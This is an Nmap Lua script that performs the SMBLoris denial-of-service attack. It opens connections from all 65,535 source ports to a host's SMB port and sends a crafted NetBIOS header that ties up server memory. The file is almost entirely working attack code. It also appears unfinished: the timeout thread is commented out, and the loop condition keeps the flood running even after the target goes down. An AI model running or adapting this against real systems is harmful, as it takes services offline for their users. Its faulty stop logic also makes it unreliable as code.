local smb = require "smb"
local stdnse = require "stdnse"
local vulns = require "vulns"
local nmap = require "nmap"

description = [[
This script attempts to perform a Denial of Service on the target host with the
the SMBLoris vulnerability. This attack allows up to 8GB of physical RAM to be
used per source IP (where each source port consumes 128KB).

As of 8 Aug 2017, there has been no plans to patch this.

This script is based off the script used by zerosum0x0 in his original
demonstration at DEFCON, which was released to public in a PR on Metasploit.

References:
* http://smbloris.com/
* https://github.com/rapid7/metasploit-framework/pull/8796
]]
---
--@usage
--
--@output
--
-- @xmloutput

author = "Paulino Calderon, Wong Wai Tuck"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"exploit", "dos"}

hostrule = function(host)
  return smb.get_port(host) ~= nil
end

local host_down = false
local TIMEOUT = 30 -- number of seconds to timeout the attack
local timed_out = false

local function set_timeout()
  stdnse.sleep(TIMEOUT)
  timed_out = true
end

local function check_alive(host)
  local status = smb.get_os(host)
  if not status then
    host_down = true
  end
end

local function send_dos(host, port, src_port)
  if host_down or timed_out then
    return
  end

  local socket = nmap.new_socket()

  local try = nmap.new_try()

  try(socket:bind("0.0.0.0", src_port))
  socket:connect(host, port)
  socket:send('\x00\x01\xff\xff')

  local status, data = socket:receive()
end

action = function(host)
  port = smb.get_port(host)
  local timeout = tonumber(stdnse.get_script_args(SCRIPT_NAME .. '.timeout'))
    or TIMEOUT
  --local timeout_thread = stdnse.new_thread(set_timeout, timeout)

  while (not timed_out) or (not host_down)  do
    for i=1, 65535, 1 do
      local co = stdnse.new_thread(send_dos, host, port, i)
    end
    check_alive(host)
  end
  -- if vuln, stop the DoS and show vuln to user

  if host_down then
    stdnse.debug1('yay')
  end

  return
end




